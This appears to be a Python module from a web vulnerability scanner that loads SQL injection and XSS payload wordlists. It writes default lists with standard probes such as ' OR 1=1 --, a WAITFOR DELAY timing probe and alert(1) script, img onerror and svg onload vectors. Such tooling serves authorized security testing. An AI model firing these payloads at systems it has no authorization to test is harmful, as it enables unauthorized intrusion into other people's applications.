"""
payload_manager.py
------------------
Handles the structured loading and generation of payload wordlists for SQLI / XSS attacks.
Ethical Note: Only use these payloads on authorized, intentionally vulnerable targets!
"""

import os
from config import PAYLOADS_DIR

__all__ = ['get_sqli_payloads', 'get_xss_payloads']


def load_payloads(filename: str) -> list[str]:
    """
    Load payloads from a text file stored in the configuration payload directory,
    one per line, skipping blank lines and comments.
    Generates sensible defaults if files don't exist.

    Args:
        filename (str): Base file name in the PAYLOADS_DIR e.g. 'sqli_payloads.txt'

    Returns:
        list[str]: Array of extracted attack payloads
    """
    path = os.path.join(PAYLOADS_DIR, filename)
    payloads = []
    
    try:
        # Create directory and basic payloads if they don't exist on disk
        os.makedirs(PAYLOADS_DIR, exist_ok=True)
        if not os.path.exists(path):
            with open(path, 'w', encoding='utf-8') as f:
                if 'sqli' in filename:
                    f.write("' OR 1=1 --\n' OR 'a'='a\nadmin' --\n1' WAITFOR DELAY '0:0:5'--\n")
                else:
                    f.write("\"><script>alert(1)</script>\n'><img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n")
                    
        with open(path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    payloads.append(line)
    except Exception as e:
        print(f"[!] Could not load payloads from {filename}: {e}")
        
    return payloads


def get_sqli_payloads() -> list[str]:
    """Get a list of SQL Injection file payloads."""
    return load_payloads('sqli_payloads.txt')


def get_xss_payloads() -> list[str]:
    """Get a list of XSS file payloads."""
    return load_payloads('xss_payloads.txt')
